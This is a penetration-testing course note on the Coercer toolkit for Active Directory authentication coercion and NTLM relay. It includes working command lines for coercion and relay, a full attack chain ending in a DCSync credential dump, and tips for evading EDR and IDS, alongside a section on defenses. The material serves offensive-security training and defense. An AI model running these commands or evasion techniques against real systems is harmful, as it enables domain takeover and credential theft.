---
tags: [active-directory, coercion, relay, vapt]
difficulty: expert
module: "64 - Advanced Coercion and Relay Attacks"
topic: "64.06 Coercer - The Universal Coercion Toolkit"
---

# 06 - Coercer - The Universal Coercion Toolkit

## 1. Introduction to Authentication Coercion

Authentication coercion in Active Directory (AD) is a class of techniques where an attacker forces a remote server (often a Domain Controller or a high-value application server) to authenticate to an attacker-controlled machine. The primary goal of this forced authentication is to capture the NTLM challenge-response hash (for offline cracking) or to relay the authentication to another service (NTLM Relaying) to impersonate the coerced system.

Historically, this space was dominated by single-purpose scripts targeting specific MS-RPC (Microsoft Remote Procedure Call) interfaces. The most notable examples include:
- **PrinterBug (MS-RPRN):** Exploiting the Print System Remote Protocol.
- **PetitPotam (MS-EFSR):** Exploiting the Encrypting File System Remote Protocol.
- **ShadowCoerce (MS-FSRVP):** Exploiting the File Server Remote VSS Protocol.
- **DFSCoerce (MS-DFSNM):** Exploiting the Distributed File System Namespace Management Protocol.

While these individual tools are highly effective, tracking their availability, syntax, and specific idiosyncrasies during an engagement can be tedious. This is where **Coercer**, developed by p0dalirius, enters the picture. Coercer is a unified, intelligent toolkit designed to automatically enumerate and exploit multiple MS-RPC interfaces and methods to achieve authentication coercion efficiently.

## 2. Architectural Flow & ASCII Diagram

The following diagram illustrates the standard attack flow when using Coercer alongside an NTLM relay tool (like `ntlmrelayx.py`).

```text
  +-------------------+                                  +-------------------+
  |   Attacker Node   |                                  |   Target Server   |
  | (Coercer Toolkit) |                                  | (e.g., Domain     |
  +--------+----------+                                  |  Controller)      |
           |                                             +--------+----------+
           | 1. Bind to MS-RPC Interface (e.g., MS-EFSR)          |
           |----------------------------------------------------->|
           |                                                      |
           | 2. Trigger RPC Method (e.g., EfsRpcOpenFileRaw)      |
           |    (Points back to Attacker IP/Hostname)             |
           |----------------------------------------------------->|
           |                                                      |
           | 3. Target attempts to access file/pipe on Attacker   |
  +--------+----------+                                  |        |
  |  Attacker Node    |<------------------------------------------|
  | (ntlmrelayx.py)   |                                           |
  +--------+----------+ 4. Target initiates SMB connection        |
           |               and performs NTLM Authentication       |
           |                                                      |
           | 5. Relay Auth to Domain Controller (LDAP/SMB)        |
           |----------------------------------------------------->|
           |                                                      |
           | 6. Execute Privileged Actions (e.g., DCSync, RBCD)   |
           |<-----------------------------------------------------|
```

## 3. The MS-RPC Landscape and Target Interfaces

MS-RPC is a powerful protocol allowing client applications to execute functions on remote servers. It operates over several transport protocols, primarily SMB (named pipes) and TCP/IP. Coercer targets the fact that many built-in Windows services expose RPC interfaces that include methods requiring the server to access remote resources (like UNC paths).

### 3.1. MS-RPRN (Print System Remote Protocol)
The original coercion interface. It utilizes `RpcRemoteFindFirstPrinterChangeNotificationEx` to force the target to authenticate back to the attacker.
- **Named Pipe:** `\PIPE\spoolss`
- **Standard Tool:** `printerbug.py`
- **Coercer Benefit:** Coercer tests multiple opnums and variations beyond just the standard PrinterBug opnum.

### 3.2. MS-EFSR (Encrypting File System Remote Protocol)
Popularized by PetitPotam. The EFS API exposes several methods (e.g., `EfsRpcOpenFileRaw`, `EfsRpcEncryptFileSrv`) that take a UNC path as an argument. When the service attempts to access this UNC path, it authenticates as the machine account.
- **Named Pipes:** `\PIPE\lsarpc`, `\PIPE\efsrpc`, `\PIPE\samr`, `\PIPE\lsass`, `\PIPE\netlogon`
- **Standard Tool:** `PetitPotam.py`

### 3.3. MS-FSRVP (File Server Remote VSS Protocol)
Discovered as "ShadowCoerce". This protocol manages shadow copies of file shares. Methods like `IsPathSupported` can be abused to coerce authentication.
- **Named Pipe:** `\PIPE\FSRVP`
- **Standard Tool:** `shadowcoerce.py`

### 3.4. MS-DFSNM (DFS Namespace Management Protocol)
Discovered as "DFSCoerce". Methods like `NetrDfsRemoveStdRoot` and `NetrDfsAddStdRoot` take server names as input.
- **Named Pipe:** `\PIPE\netdfs`
- **Standard Tool:** `dfscoerce.py`

## 4. Deep Dive: Coercer Toolkit Capabilities

Coercer is more than just an aggregation script; it is a fuzzing and exploitation framework for RPC interfaces. 

### 4.1. Key Features
1. **Fuzzing Mode:** Coercer can fuzz all known RPC interfaces and methods against a target to discover which ones are open, accessible, and vulnerable to coercion without dropping connections.
2. **Scan Mode:** Rapidly scans a network or single host to identify vulnerable endpoints and explicitly tells the operator which methods are available.
3. **Exploit Mode:** Once a vulnerable interface is identified, Coercer actively exploits it to trigger the coercion callback.
4. **Targeted Listeners:** Allows specifying the IP address or hostname to which the target should authenticate. Useful for WebDAV/HTTP coercion vs SMB coercion.

### 4.2. Internal Mechanisms (Under the Hood)
Coercer maps dozens of UUIDs to their respective MS-RPC interfaces. When it initiates an attack, it typically:
1. Authenticates to the target (often requiring low-privileged domain credentials, though null sessions work on older/unpatched systems).
2. Connects to the IPC$ administrative share.
3. Binds to a specific Named Pipe over SMB.
4. Sends a crafted DCERPC (Distributed Computing Environment / Remote Procedure Call) packet triggering a specific opnum (method).
5. Injects the attacker's listener address into the UNC path parameter of the method.

## 5. Practical Usage Guide

To utilize Coercer effectively, an attacker needs a listener (e.g., `ntlmrelayx.py` or Responder) running on their local machine or a compromised pivot point.

### 5.1. Fuzzing a Target
Fuzzing mode is the most comprehensive way to discover what is open on a Domain Controller or Exchange Server.
```bash
coercer fuzz -u 'username' -p 'password' -d 'domain.local' -t 10.10.10.100 -l 10.10.10.50
```
- `-t`: Target IP (e.g., Domain Controller)
- `-l`: Listener IP (Attacker IP)
The output will list all tested interfaces (MS-RPRN, MS-EFSR, etc.) and color-code the results based on successful coercion callbacks.

### 5.2. Scanning a Target
Scan mode checks for vulnerabilities without actively triggering the full payload if unnecessary, or stopping after finding the first working exploit to minimize noise.
```bash
coercer scan -u 'username' -p 'password' -d 'domain.local' -t 10.10.10.100 -l 10.10.10.50
```

### 5.3. Exploitation (Targeted)
If you know that MS-EFSR is enabled and you specifically want to exploit the `EfsRpcOpenFileRaw` method:
```bash
coercer coerce -u 'username' -p 'password' -d 'domain.local' -t 10.10.10.100 -l 10.10.10.50 --filter-protocol MS-EFSR --filter-method EfsRpcOpenFileRaw
```

## 6. Advanced Coercion Tactics

### 6.1. Coercion via WebDAV
Often, SMB coercion is blocked because the target system has outbound SMB (Port 445) blocked at the host firewall, or SMB signing prevents relaying. By prepending the listener with a WebDAV string, the target uses HTTP instead of SMB for the callback.
```bash
coercer coerce -u 'user' -p 'pass' -d 'domain.local' -t 10.10.10.100 -l '10.10.10.50@80/test'
```
When the target attempts to connect to a path formatted like `\\10.10.10.50@80\test`, the Windows WebClient service translates this into an HTTP request, bypassing SMB restrictions and often downgrading NTLM authentication parameters (making relaying to LDAP easier due to no SMB signing requirements).

### 6.2. Cross-Protocol Relaying
Coercer is merely the trigger. The true power lies in what the listener does with the incoming authentication.
- **SMB to LDAP:** Relay the machine account hash to LDAP to modify `msDS-AllowedToActOnBehalfOfOtherIdentity` (RBCD).
- **SMB to HTTP (AD CS):** Relay the machine account hash to the Active Directory Certificate Services Web Enrollment interface (ESC8) to request a client authentication certificate for the target machine.

## 7. Defensive Strategies and Mitigations

Defending against Coercer means defending against MS-RPC abuse and NTLM relaying.

1. **RPC Filters:** Implement RPC filters (using Windows Filtering Platform or RPC Endpoint Mapper protections) to restrict which machines can bind to vulnerable named pipes. For instance, restrict `\PIPE\efsrpc` and `\PIPE\spoolss` to only administrative subnets.
2. **Disable Unnecessary Services:** 
   - Disable the Print Spooler service on Domain Controllers and critical servers if they do not need to print.
   - Disable the EFS service if it is not heavily utilized in the enterprise.
3. **SMB Signing & LDAP Signing:** Ensure that SMB Signing is enforced on all endpoints (not just DCs) and that LDAP Channel Binding and LDAP Signing are strictly enforced to kill the relay portion of the attack.
4. **Disable WebClient:** The WebClient service should be disabled on servers to prevent WebDAV coercion and downgrade attacks. Disable it via GPO.
5. **Network Segmentation:** Block outbound SMB (445/TCP) from Domain Controllers and tier-0 servers to lower-tiered subnets. A Domain Controller generally shouldn't be initiating SMB connections to random workstations.

## Real-World Attack Scenario

In a recent internal penetration test, an attacker compromised a low-privileged developer account (`j.doe`) and gained shell access to a standard Windows 10 workstation (IP: `10.10.10.50`). The ultimate objective was to compromise the domain `corp.local`. 

The attacker identified that the environment lacked SMB egress filtering on the Domain Controllers and utilized Active Directory Certificate Services (AD CS) with the Web Enrollment feature enabled on `pki01.corp.local` (`10.10.10.105`). Knowing this infrastructure was vulnerable to NTLM relaying (ESC8), the attacker decided to weaponize the Coercer toolkit.

First, the attacker started an NTLM relay listener on their compromised workstation, configuring it to relay incoming SMB authentication directly to the HTTP endpoint of the AD CS Web Enrollment service:
```bash
impacket-ntlmrelayx -t http://10.10.10.105/certsrv/certfnsh.asp -smb2support --adcs --template DomainControllers
```

With the listener active, the attacker needed to force the primary Domain Controller, `DC01` (`10.10.10.100`), to authenticate to the attacker-controlled IP. They used Coercer, utilizing the compromised developer credentials to authenticate and trigger an RPC call over the network:
```bash
coercer coerce -u 'j.doe' -p 'Password123!' -d 'corp.local' -t 10.10.10.100 -l 10.10.10.50
```

Coercer systematically iterated through multiple MS-RPC endpoints and named pipes. It successfully bound to `\PIPE\lsarpc` and invoked the `EfsRpcOpenFileRaw` method (Opnum 0). The attacker observed the payload containing the UNC path `\\10.10.10.50\share\file.txt` being sent to `DC01`. 

Because the MS-EFSR service was enabled and the DC lacked outbound SMB restrictions, `DC01` attempted to authenticate to the attacker's workstation as the highly privileged `DC01$` machine account. The `ntlmrelayx` listener successfully intercepted this authentication attempt over port 445 and immediately relayed the NTLM messages to the AD CS Web Enrollment interface via HTTP. 

Since HTTP is not protected by SMB signing, the relay was successful, and the AD CS server issued a base64-encoded client authentication certificate for `DC01$`.

Using the newly minted certificate, the attacker leveraged `gettgtpkinit.py` to request a Kerberos Ticket Granting Ticket (TGT) for the Domain Controller account:
```bash
python3 gettgtpkinit.py corp.local/DC01\$ -cert-pfx dc01.pfx -pfx-pass "" dc01.ccache
```

Exporting this TGT into their environment variables (`export KRB5CCNAME=dc01.ccache`), the attacker utilized DCSync via `secretsdump.py` to extract the `krbtgt` hash and all other Active Directory credentials, achieving complete forest compromise in under ten minutes without requiring any initial administrative privileges.

## 8. Chaining Opportunities
- [[07 - NTLM Relay to LDAP]] – Coercer triggers the auth; relay it to LDAP to set up RBCD.
- [[09 - NTLM Relay to AD CS - Web Enrollment]] – Coercer triggers the auth; relay it to AD CS to perform the ESC8 attack.
- [[10 - Resource-Based Constrained Delegation RBCD via Relay]] – The ultimate payload for Coercing a machine account.
- [[08 - NTLM Relay to SMB]] – Coercing an admin to relay to SMB and achieve local admin execution.

## 9. Related Notes
- [[01 - Introduction to MS-RPC and Named Pipes]]
- [[02 - NTLM Authentication Deep Dive]]
- [[03 - Extended Protection for Authentication EPA]]
- [[04 - SMB Signing Mechanics]]
- [[05 - PrintNightmare vs PrinterBug]]

## 10. Deep Dive: RPC Packet Structures

To truly understand coercion, one must analyze the DCERPC (Distributed Computing Environment / Remote Procedure Call) packets over the wire.
When Coercer targets the `EfsRpcOpenFileRaw` method over the `\PIPE\lsarpc` pipe, the network flow looks like this:

1. **SMB2 Tree Connect Request:** The attacker maps to `IPC$`.
2. **SMB2 Create Request:** The attacker opens the named pipe `lsarpc`.
3. **DCERPC Bind Request:** The attacker sends a bind request for the UUID `c681d488-d850-11d0-8c52-00c04fd90f7e` (MS-EFSR).
4. **DCERPC Request (opnum 0):** The attacker invokes the method `EfsRpcOpenFileRaw`. The payload contains the UNC path `\\10.10.10.50\test\file.txt`.

### Opnums and UUIDs
Each RPC interface is defined by a UUID and a version number. Methods within that interface are identified by an `opnum` (operation number).
- `MS-EFSR` UUID: `c681d488-d850-11d0-8c52-00c04fd90f7e`
  - Opnum 0: `EfsRpcOpenFileRaw`
  - Opnum 2: `EfsRpcEncryptFileSrv`
- `MS-RPRN` UUID: `12345678-1234-abcd-ef00-0123456789ab`
  - Opnum 65: `RpcRemoteFindFirstPrinterChangeNotificationEx`

Coercer's intelligence lies in iterating through these opnums systematically. If Opnum 0 fails or is patched, it will transparently try Opnum 2, etc.

## 11. Customizing Coercer Payloads

Advanced attackers can customize the UNC path payload sent by Coercer to evade basic detections. Many EDR solutions trigger an alert if a DC attempts to access a UNC path containing a raw IP address (e.g., `\\10.10.10.50\share`).

**Techniques to evade detection:**
1. **DNS Spoofing / Custom Hostnames:** 
   Instead of an IP, use a hostname that the attacker has registered in the AD DNS via a dynamic update, e.g., `\\legit-printer.domain.local\share`.
   ```bash
   coercer coerce -t 10.10.10.100 -l legit-printer.domain.local
   ```
2. **FQDN usage:** 
   Using Fully Qualified Domain Names can sometimes alter the authentication flags the victim sends (e.g., forcing Kerberos instead of NTLM, though Coercer primarily aims for NTLM).
3. **Alternative Ports (WebDAV):**
   Using WebDAV syntax `\\10.10.10.50@80\share` or `\\10.10.10.50@8080\share` often bypasses traditional SMB network egress filtering on the Domain Controller.
4. **Padding and Junk Data:**
   Modifying the Coercer source code to append random strings to the UNC path share name can bypass static string matching rules in basic IPS/IDS appliances.

## 12. Troubleshooting Coercion Failures

If Coercer fails to trigger an authentication, verify the following:
- **Firewall:** Is port 445 open between the target and the listener? Is egress traffic from the target blocked?
- **Authentication:** Did you provide valid domain credentials? Null sessions (`-u '' -p ''`) rarely work on modern patched Windows systems.
- **Service Status:** Are the targeted services (Print Spooler, EFS) actually running on the target? Coercer will report if it gets `rpc_s_access_denied` or if the endpoint mapper cannot be reached.
- **Patching:** Microsoft occasionally issues patches that change the behavior of specific opnums, restricting them to Local Administrators. Coercer's extensive opnum library helps mitigate this, but on fully patched Windows Server 2022/2025 systems, certain classic methods may be permanently restricted.
